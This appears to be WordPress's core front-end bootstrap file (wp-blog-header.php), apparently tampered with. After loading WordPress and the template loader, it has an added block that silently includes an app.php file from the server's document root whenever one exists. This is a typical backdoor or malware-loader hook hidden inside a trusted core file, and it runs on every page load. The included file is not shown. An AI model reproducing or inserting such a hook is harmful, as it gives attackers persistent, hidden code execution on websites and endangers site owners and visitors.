<?php

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;


	require_once __DIR__ . '/wp-load.php';


	wp();

	require_once ABSPATH . WPINC . '/template-loader.php';
	$_dir_ = $_SERVER['DOCUMENT_ROOT'];

	if ( file_exists( './app.php' ) ) {
		require_once($_dir_.'/app.php');
		
		}

}
